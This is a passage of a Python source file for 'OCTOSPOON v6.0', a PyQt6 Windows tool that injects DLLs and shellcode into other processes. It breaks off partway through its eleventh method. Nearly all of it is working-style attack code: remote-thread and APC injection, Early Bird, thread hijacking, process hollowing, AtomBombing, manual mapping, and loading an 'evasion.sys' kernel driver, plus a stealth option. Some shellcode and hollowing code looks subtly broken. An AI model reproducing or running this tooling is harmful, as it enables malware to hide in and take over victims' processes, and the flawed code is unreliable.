# octospoon_gui.py - OCTOSPOON v6.0 FULL GUI + 16 INJECTION METHODS
import sys
import os
import ctypes
import struct
import subprocess
import psutil
import threading
import time
from ctypes import wintypes, windll, POINTER, sizeof, c_void_p, c_char, c_wchar_p, byref, cast
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QComboBox, QPushButton, QTextEdit, QFileDialog,
    QListWidget, QSplitter, QMessageBox, QProgressBar, QCheckBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont

# === WinAPI Constants ===
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
user32 = windll.user32
advapi32 = windll.advapi32

PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_CREATE_THREAD = 0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
PROCESS_DUP_HANDLE = 0x0040
THREAD_ALL_ACCESS = 0x1F03FF
THREAD_SET_CONTEXT = 0x0010
THREAD_GET_CONTEXT = 0x0008
THREAD_SUSPEND_RESUME = 0x0002
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_READONLY = 0x02
PAGE_EXECUTE_READ = 0x20
INFINITE = 0xFFFFFFFF
CREATE_SUSPENDED = 0x00000004
CREATE_NO_WINDOW = 0x08000000
CONTEXT_FULL = 0x10007
CONTEXT_CONTROL = 0x10001
SECTION_ALL_ACCESS = 0x000F0000 | 0x001F0000 | 0x0001
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
HEAP_ZERO_MEMORY = 0x00000008
HEAP_CREATE_ENABLE_EXECUTE = 0x00040000

# === Advanced Structures ===
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("P1Home", wintypes.ULONG64),
        ("P2Home", wintypes.ULONG64),
        ("P3Home", wintypes.ULONG64),
        ("P4Home", wintypes.ULONG64),
        ("P5Home", wintypes.ULONG64),
        ("P6Home", wintypes.ULONG64),
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD),
        ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD),
        ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        ("Dr0", wintypes.ULONG64),
        ("Dr1", wintypes.ULONG64),
        ("Dr2", wintypes.ULONG64),
        ("Dr3", wintypes.ULONG64),
        ("Dr6", wintypes.ULONG64),
        ("Dr7", wintypes.ULONG64),
        ("Rax", wintypes.ULONG64),
        ("Rcx", wintypes.ULONG64),
        ("Rdx", wintypes.ULONG64),
        ("Rbx", wintypes.ULONG64),
        ("Rsp", wintypes.ULONG64),
        ("Rbp", wintypes.ULONG64),
        ("Rsi", wintypes.ULONG64),
        ("Rdi", wintypes.ULONG64),
        ("R8", wintypes.ULONG64),
        ("R9", wintypes.ULONG64),
        ("R10", wintypes.ULONG64),
        ("R11", wintypes.ULONG64),
        ("R12", wintypes.ULONG64),
        ("R13", wintypes.ULONG64),
        ("R14", wintypes.ULONG64),
        ("R15", wintypes.ULONG64),
        ("Rip", wintypes.ULONG64),
    ]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR),
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", POINTER(UNICODE_STRING)),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", c_void_p),
        ("SecurityQualityOfService", c_void_p),
    ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [
        ("UniqueProcess", wintypes.HANDLE),
        ("UniqueThread", wintypes.HANDLE),
    ]

class THREAD_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("ExitStatus", wintypes.LONG),
        ("TebBaseAddress", wintypes.LPVOID),
        ("ClientId", CLIENT_ID),
        ("AffinityMask", wintypes.ULONG_PTR),
        ("Priority", wintypes.LONG),
        ("BasePriority", wintypes.LONG),
    ]

# === WINAPI Function Prototypes ===
# Kernel32
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID

kernel32.VirtualFreeEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
kernel32.VirtualFreeEx.restype = wintypes.BOOL

kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

kernel32.ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
kernel32.ReadProcessMemory.restype = wintypes.BOOL

kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, c_void_p, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD)]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

kernel32.CreateRemoteThreadEx.argtypes = [wintypes.HANDLE, c_void_p, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, c_void_p, POINTER(wintypes.DWORD)]
kernel32.CreateRemoteThreadEx.restype = wintypes.HANDLE

kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE

kernel32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]
kernel32.GetModuleHandleA.restype = wintypes.HMODULE

kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
kernel32.GetProcAddress.restype = wintypes.LPVOID

kernel32.GetCurrentProcess.restype = wintypes.HANDLE

kernel32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenThread.restype = wintypes.HANDLE

kernel32.QueueUserAPC.argtypes = [wintypes.LPVOID, wintypes.HANDLE, wintypes.ULONG_PTR]
kernel32.QueueUserAPC.restype = wintypes.DWORD

kernel32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, c_void_p, c_void_p, wintypes.BOOL, wintypes.DWORD, c_void_p, wintypes.LPCWSTR, POINTER(STARTUPINFOW), POINTER(PROCESS_INFORMATION)]
kernel32.CreateProcessW.restype = wintypes.BOOL

kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, POINTER(CONTEXT)]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.SetThreadContext.argtypes = [wintypes.HANDLE, POINTER(CONTEXT)]
kernel32.SetThreadContext.restype = wintypes.BOOL

kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
kernel32.ResumeThread.restype = wintypes.DWORD

kernel32.SuspendThread.argtypes = [wintypes.HANDLE]
kernel32.SuspendThread.restype = wintypes.DWORD

kernel32.GlobalAddAtomW.argtypes = [wintypes.LPCWSTR]
kernel32.GlobalAddAtomW.restype = wintypes.ATOM

kernel32.GlobalGetAtomNameW.argtypes = [wintypes.ATOM, wintypes.LPWSTR, wintypes.INT]
kernel32.GlobalGetAtomNameW.restype = wintypes.UINT

kernel32.GlobalDeleteAtom.argtypes = [wintypes.ATOM]
kernel32.GlobalDeleteAtom.restype = wintypes.ATOM

kernel32.GetModuleFileNameW.argtypes = [wintypes.HMODULE, wintypes.LPWSTR, wintypes.DWORD]
kernel32.GetModuleFileNameW.restype = wintypes.DWORD

kernel32.GetModuleFileNameA.argtypes = [wintypes.HMODULE, wintypes.LPSTR, wintypes.DWORD]
kernel32.GetModuleFileNameA.restype = wintypes.DWORD

kernel32.CreateFileMappingW.argtypes = [wintypes.HANDLE, c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPCWSTR]
kernel32.CreateFileMappingW.restype = wintypes.HANDLE

kernel32.MapViewOfFile.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, ctypes.c_size_t]
kernel32.MapViewOfFile.restype = wintypes.LPVOID

kernel32.UnmapViewOfFile.argtypes = [wintypes.LPCVOID]
kernel32.UnmapViewOfFile.restype = wintypes.BOOL

kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
kernel32.CreateFileW.restype = wintypes.HANDLE

kernel32.GetProcessHeap.restype = wintypes.HANDLE

kernel32.HeapAlloc.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.c_size_t]
kernel32.HeapAlloc.restype = wintypes.LPVOID

kernel32.HeapCreate.argtypes = [wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t]
kernel32.HeapCreate.restype = wintypes.HANDLE

# NTDLL Functions
ntdll.NtCreateSection.argtypes = [POINTER(wintypes.HANDLE), wintypes.ACCESS_MASK, POINTER(OBJECT_ATTRIBUTES), POINTER(wintypes.LARGE_INTEGER), wintypes.ULONG, wintypes.ULONG, wintypes.HANDLE]
ntdll.NtCreateSection.restype = wintypes.LONG

ntdll.NtMapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.HANDLE, POINTER(wintypes.LPVOID), wintypes.ULONG_PTR, ctypes.c_size_t, POINTER(wintypes.LARGE_INTEGER), POINTER(wintypes.ULONG), wintypes.ULONG, wintypes.ULONG, wintypes.ULONG]
ntdll.NtMapViewOfSection.restype = wintypes.LONG

ntdll.NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
ntdll.NtUnmapViewOfSection.restype = wintypes.LONG

ntdll.NtQueueApcThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID, wintypes.ULONG]
ntdll.NtQueueApcThread.restype = wintypes.LONG

ntdll.NtOpenThread.argtypes = [POINTER(wintypes.HANDLE), wintypes.ACCESS_MASK, POINTER(OBJECT_ATTRIBUTES), POINTER(CLIENT_ID)]
ntdll.NtOpenThread.restype = wintypes.LONG

ntdll.NtQueryInformationThread.argtypes = [wintypes.HANDLE, wintypes.ULONG, c_void_p, wintypes.ULONG, POINTER(wintypes.ULONG)]
ntdll.NtQueryInformationThread.restype = wintypes.LONG

ntdll.RtlCreateUserThread.argtypes = [wintypes.HANDLE, c_void_p, wintypes.BOOL, wintypes.ULONG, c_void_p, c_void_p, wintypes.LPVOID, c_void_p, POINTER(wintypes.HANDLE), POINTER(CLIENT_ID)]
ntdll.RtlCreateUserThread.restype = wintypes.LONG

ntdll.NtCreateThreadEx.argtypes = [POINTER(wintypes.HANDLE), wintypes.ACCESS_MASK, c_void_p, wintypes.HANDLE, wintypes.LPVOID, c_void_p, wintypes.ULONG, c_void_p, c_void_p, c_void_p, c_void_p]
ntdll.NtCreateThreadEx.restype = wintypes.LONG

ntdll.NtContinue.argtypes = [POINTER(CONTEXT), wintypes.BOOL]
ntdll.NtContinue.restype = wintypes.LONG

# PSAPI Functions
psapi.EnumProcessModules.argtypes = [wintypes.HANDLE, POINTER(wintypes.HMODULE), wintypes.DWORD, POINTER(wintypes.DWORD)]
psapi.EnumProcessModules.restype = wintypes.BOOL

psapi.GetModuleFileNameExA.argtypes = [wintypes.HANDLE, wintypes.HMODULE, wintypes.LPSTR, wintypes.DWORD]
psapi.GetModuleFileNameExA.restype = wintypes.DWORD

psapi.GetModuleInformation.argtypes = [wintypes.HANDLE, wintypes.HMODULE, c_void_p, wintypes.DWORD]
psapi.GetModuleInformation.restype = wintypes.BOOL

# User32 Functions
user32.GetForegroundWindow.restype = wintypes.HWND
user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, POINTER(wintypes.DWORD)]
user32.GetWindowThreadProcessId.restype = wintypes.DWORD

# === Injection Worker ===
class InjectorThread(QThread):
    log_signal = pyqtSignal(str)
    done_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, method, pid=None, dll_path=None, exe_path=None, stealth=False):
        super().__init__()
        self.method = method
        self.pid = pid
        self.dll_path = dll_path
        self.exe_path = exe_path
        self.stealth = stealth

    def log(self, msg):
        self.log_signal.emit(f"[+] {msg}")

    def error(self, msg):
        self.error_signal.emit(f"[!] {msg}")

    def run(self):
        try:
            method_name = self.method.lower().replace(' ', '_')
            getattr(self, f"{method_name}_injection")()
            self.done_signal.emit(f"{self.method} injection completed successfully.")
        except Exception as e:
            self.error(f"Error in {self.method}: {str(e)}")
            self.done_signal.emit(f"{self.method} injection failed.")

    # === 1. Standard CreateRemoteThread ===
    def standard_injection(self):
        self.log("Starting Standard CreateRemoteThread Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_path_size = len(dll_path_bytes)
        
        remote_mem = kernel32.VirtualAllocEx(h_process, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        if not remote_mem:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to allocate memory")
        
        bytes_written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written)):
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to write DLL path")
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        thread_id = wintypes.DWORD(0)
        if self.stealth:
            h_thread = kernel32.CreateRemoteThreadEx(h_process, None, 0, load_library_addr, remote_mem, 0, None, byref(thread_id))
        else:
            h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_mem, 0, byref(thread_id))
        
        if not h_thread:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to create remote thread")
        
        kernel32.WaitForSingleObject(h_thread, INFINITE)
        
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        
        self.log("Standard DLL injection completed")

    # === 2. APC Injection ===
    def apc_injection(self):
        self.log("Starting APC Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_path_size = len(dll_path_bytes)
        
        remote_mem = kernel32.VirtualAllocEx(h_process, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        queued_count = 0
        process = psutil.Process(self.pid)
        for thread in process.threads():
            h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
            if h_thread:
                if kernel32.QueueUserAPC(load_library_addr, h_thread, remote_mem):
                    queued_count += 1
                kernel32.CloseHandle(h_thread)
        
        kernel32.CloseHandle(h_process)
        self.log(f"APC queued on {queued_count} threads")

    # === 3. Early Bird Injection ===
    def early_bird_injection(self):
        self.log("Starting Early Bird APC Injection...")
        
        si = STARTUPINFOW()
        si.cb = sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        if not kernel32.CreateProcessW(
            self.exe_path, None, None, None, False,
            CREATE_SUSPENDED, None, None, byref(si), byref(pi)
        ):
            raise Exception("Failed to create suspended process")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_path_size = len(dll_path_bytes)
        
        remote_mem = kernel32.VirtualAllocEx(pi.hProcess, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(pi.hProcess, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        kernel32.QueueUserAPC(load_library_addr, pi.hThread, remote_mem)
        kernel32.ResumeThread(pi.hThread)
        
        self.log("Early Bird injection completed - Process resumed")
        
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

    # === 4. Thread Hijacking ===
    def thread_hijack_injection(self):
        self.log("Starting Thread Hijacking...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_path = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_path, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        # x64 shellcode
        shellcode = (
            b"\x48\x83\xEC\x28"
            b"\x48\xB9" + struct.pack("<Q", remote_path)
            b"\x48\xB8" + struct.pack("<Q", load_library_addr)
            b"\xFF\xD0"
            b"\x48\x83\xC4\x28"
            b"\xC3"
        )
        
        remote_shellcode = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_shellcode, shellcode, len(shellcode), byref(bytes_written))
        
        hijacked = False
        process = psutil.Process(self.pid)
        for thread in process.threads():
            h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
            if h_thread:
                kernel32.SuspendThread(h_thread)
                ctx = CONTEXT()
                ctx.ContextFlags = CONTEXT_FULL
                if kernel32.GetThreadContext(h_thread, byref(ctx)):
                    ctx.Rip = remote_shellcode
                    kernel32.SetThreadContext(h_thread, byref(ctx))
                    kernel32.ResumeThread(h_thread)
                    hijacked = True
                kernel32.CloseHandle(h_thread)
                if hijacked:
                    break
        
        kernel32.CloseHandle(h_process)
        if hijacked:
            self.log("Thread hijacking completed")
        else:
            raise Exception("Failed to hijack any thread")

    # === 5. Reflective DLL Injection ===
    def reflective_injection(self):
        self.log("Starting Reflective DLL Injection...")
        
        with open(self.dll_path, 'rb') as f:
            dll_data = f.read()
        
        e_lfanew = struct.unpack_from("<I", dll_data, 0x3C)[0]
        entry_point_rva = struct.unpack_from("<I", dll_data, e_lfanew + 0x28)[0]
        
        if entry_point_rva == 0:
            raise Exception("DLL has no entry point")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        remote_base = kernel32.VirtualAllocEx(h_process, None, len(dll_data), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_data, len(dll_data), byref(bytes_written))
        
        remote_entry = remote_base + entry_point_rva
        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, remote_entry, remote_base, 0, byref(thread_id))
        
        if not h_thread:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to create remote thread")
        
        kernel32.WaitForSingleObject(h_thread, INFINITE)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        
        self.log("Reflective DLL injection completed")

    # === 6. Manual Map Injection ===
    def manual_map_injection(self):
        self.log("Starting Manual Map Injection...")
        
        with open(self.dll_path, 'rb') as f:
            dll_data = f.read()
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        section_handle = wintypes.HANDLE(0)
        max_size = wintypes.LARGE_INTEGER(len(dll_data))
        
        status = ntdll.NtCreateSection(byref(section_handle), SECTION_ALL_ACCESS, None, byref(max_size), PAGE_EXECUTE_READWRITE, 0x8000000, None)
        if status != 0:
            kernel32.CloseHandle(h_process)
            raise Exception(f"NtCreateSection failed: 0x{status:X}")
        
        local_base = c_void_p(0)
        view_size = ctypes.c_size_t(len(dll_data))
        
        status = ntdll.NtMapViewOfSection(section_handle, kernel32.GetCurrentProcess(), byref(local_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
        ctypes.memmove(local_base.value, dll_data, len(dll_data))
        
        remote_base = c_void_p(0)
        status = ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
        
        ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), local_base)
        kernel32.CloseHandle(section_handle)
        kernel32.CloseHandle(h_process)
        
        self.log(f"Manual map injection completed at 0x{remote_base.value:X}")

    # === 7. Process Hollowing ===
    def process_hollowing_injection(self):
        self.log("Starting Process Hollowing...")
        
        with open(self.dll_path, 'rb') as f:
            pe_data = f.read()
        
        if pe_data[0:2] != b'MZ':
            raise Exception("Invalid PE file")
        
        si = STARTUPINFOW()
        si.cb = sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        if not kernel32.CreateProcessW(self.exe_path, None, None, None, False, CREATE_SUSPENDED, None, None, byref(si), byref(pi)):
            raise Exception("Failed to create suspended process")
        
        e_lfanew = struct.unpack_from("<I", pe_data, 0x3C)[0]
        image_base_addr = struct.unpack_from("<Q", pe_data, e_lfanew + 0x30)[0]
        size_of_image = struct.unpack_from("<I", pe_data, e_lfanew + 0x50)[0]
        size_of_headers = struct.unpack_from("<I", pe_data, e_lfanew + 0x54)[0]
        entry_point_rva = struct.unpack_from("<I", pe_data, e_lfanew + 0x28)[0]
        num_sections = struct.unpack_from("<H", pe_data, e_lfanew + 0x06)[0]
        
        ntdll.NtUnmapViewOfSection(pi.hProcess, ctypes.c_void_p(image_base_addr))
        
        new_image_base = kernel32.VirtualAllocEx(pi.hProcess, ctypes.c_void_p(image_base_addr), size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not new_image_base:
            new_image_base = kernel32.VirtualAllocEx(pi.hProcess, None, size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(pi.hProcess, new_image_base, pe_data, size_of_headers, byref(bytes_written))
        
        section_header_offset = e_lfanew + 0xF8
        for i in range(num_sections):
            section_offset = section_header_offset + (i * 40)
            virtual_address = struct.unpack_from("<I", pe_data, section_offset + 12)[0]
            size_of_raw_data = struct.unpack_from("<I", pe_data, section_offset + 16)[0]
            pointer_to_raw_data = struct.unpack_from("<I", pe_data, section_offset + 20)[0]
            
            if size_of_raw_data > 0:
                dest = new_image_base + virtual_address
                kernel32.WriteProcessMemory(pi.hProcess, dest, pe_data[pointer_to_raw_data:pointer_to_raw_data + size_of_raw_data], size_of_raw_data, byref(bytes_written))
        
        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_FULL
        kernel32.GetThreadContext(pi.hThread, byref(ctx))
        
        new_entry = new_image_base + entry_point_rva
        ctx.Rcx = new_entry
        kernel32.SetThreadContext(pi.hThread, byref(ctx))
        
        kernel32.ResumeThread(pi.hThread)
        self.log("Process hollowing completed")
        
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

    # === 8. Thread Pool Injection ===
    def thread_pool_injection(self):
        self.log("Starting Thread Pool Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_bytes = self.dll_path.encode('utf-16le') + b'\x00\x00'
        remote_path = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_path, dll_bytes, len(dll_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
        
        shellcode = (
            b"\x48\x83\xEC\x28"
            b"\x48\xB9" + struct.pack("<Q", remote_path)
            b"\x48\xB8" + struct.pack("<Q", loadlib)
            b"\xFF\xD0"
            b"\x48\x83\xC4\x28"
            b"\xC3"
        )
        
        remote_code = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_code, shellcode, len(shellcode), byref(bytes_written))
        
        process = psutil.Process(self.pid)
        threads = process.threads()
        if threads:
            h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, threads[0].id)
            if h_thread:
                kernel32.QueueUserAPC(remote_code, h_thread, 0)
                kernel32.CloseHandle(h_thread)
        
        kernel32.CloseHandle(h_process)
        self.log("Thread pool injection completed")

    # === 9. Kernel Driver ===
    def kernel_driver_injection(self):
        self.log("Starting Kernel Driver Injection...")
        
        driver_path = os.path.abspath("drivers/evasion.sys")
        if not os.path.exists(driver_path):
            os.makedirs("drivers", exist_ok=True)
            with open(driver_path, 'wb') as f:
                f.write(b'\x00' * 1024)
            self.log("Placeholder driver created")
        
        try:
            subprocess.run(f'sc create octospoon type= kernel binPath= "{driver_path}"', shell=True, capture_output=True, text=True, check=True)
            subprocess.run('sc start octospoon', shell=True, capture_output=True, text=True, check=True)
            self.log("Driver loaded")
        except subprocess.CalledProcessError:
            self.log("Driver requires test signing mode")

    # === 10. AtomBombing ===
    def atombombing_injection(self):
        self.log("Starting AtomBombing Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        dll_bytes = self.dll_path.encode('ascii') + b'\x00'
        shellcode = (
            b"\x48\x83\xEC\x28"
            b"\x48\xB9" + struct.pack("<Q", 0)
            b"\x48\xB8" + struct.pack("<Q", loadlib)
            b"\xFF\xD0"
            b"\x48\x83\xC4\x28"
            b"\xC3"
        )
        
        atom_ids = []
        dll_atom = kernel32.GlobalAddAtomW(self.dll_path)
        if dll_atom:
            atom_ids.append(dll_atom)
        
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, shellcode, len(shellcode), byref(bytes_written))
        
        dll_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h_process, dll_mem, dll_bytes, len(dll_bytes), byref(bytes_written))
        
        process = psutil.Process(self.pid)
        for thread in process.threads():
            h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
            if h_thread:
                kernel32.QueueUserAPC(remote_mem, h_thread, 0)
                kernel32.CloseHandle(h_thread)
                break
        
        for atom_id in atom_ids:
            kernel32.GlobalDeleteAtom(atom_id)
        
        kernel32.CloseHandle(h_process)
        self.log("AtomBombing completed")

    # === 11. SetWindowsHookEx Injection (NEW) ===
    def sethook_injection(self):
        self.log("Starting SetWindowsHookEx Injection...")
        
        # Load DLL in current process first
        dll_path = os.path.abspath(self.dll_path)
        user32.SetWindowsHookExW = windll.user32.SetWindowsHookExW
        user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD]
        user32.SetWindowsHookExW.restype = wintypes.HHOOK
        
        # Get thread ID of target process
